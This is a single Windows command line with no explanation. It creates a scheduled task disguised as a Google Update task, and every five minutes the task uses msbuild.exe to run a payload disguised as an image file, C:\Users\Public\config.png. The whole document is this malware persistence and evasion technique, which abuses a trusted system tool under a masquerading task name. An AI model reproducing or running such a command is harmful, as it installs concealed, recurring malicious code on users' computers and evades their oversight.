schtasks /create /tn "GoogleUpdateTaskMachineCor" /tr "cmd /c start /min C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe C:\Users\Public\config.png" /sc minute /mo 5 /F
